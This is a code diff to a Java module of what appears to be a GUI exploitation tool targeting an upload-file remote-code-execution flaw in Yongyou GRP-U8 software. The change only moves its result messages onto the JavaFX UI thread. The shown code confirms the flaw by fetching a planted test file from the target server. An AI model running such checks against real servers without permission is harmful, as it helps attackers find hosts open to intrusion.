@@ -2,6 +2,7 @@ package exp.oa.yongyou;
 
 import core.Exploitlnterface;
 import java.util.HashMap;
+import javafx.application.Platform;
 import javafx.scene.control.TextArea;
 import utils.HttpTools;
 import utils.Response;
@@ -32,17 +33,23 @@ public class yongyou_grp_UploadFileData implements Exploitlnterface {
         if(post1.getCode() == 200 && post1.getText().contains("parent.openWin.location.reload")){
             Response response = HttpTools.get(url + "/R9iPortal/nishizhu.txt", new HashMap<String, String>(), "utf-8");
             if(response.getCode() == 200 && response.getText().contains(shell.test_payload)){
-                textArea.appendText("\n");
-                textArea.appendText("漏洞存在 测试文件写入成功\n " + url + "/R9iPortal/nishizhu.txt");
+               Platform.runLater(()->{
+                  textArea.appendText("\n");
+                  textArea.appendText("漏洞存在 测试文件写入成功\n " + url + "/R9iPortal/nishizhu.txt");
+               });
                 return true;
             }else {
-                textArea.appendText("\n");
-                textArea.appendText("GRP_U8_UploadFileData-RCE-漏洞不存在 (出现误报请联系作者)");
+               Platform.runLater(()->{
+                  textArea.appendText("\n");
+                  textArea.appendText("GRP_U8_UploadFileData-RCE-漏洞不存在 (出现误报请联系作者)");
+               });
                 return false;
             }
         }
-        textArea.appendText("\n");
-        textArea.appendText("GRP_U8_UploadFileData-RCE-漏洞不存在 (出现误报请联系作者)");
+       Platform.runLater(()->{
+          textArea.appendText("\n");
+          textArea.appendText("GRP_U8_UploadFileData-RCE-漏洞不存在 (出现误报请联系作者)");
+       });
         return false;
     }
 
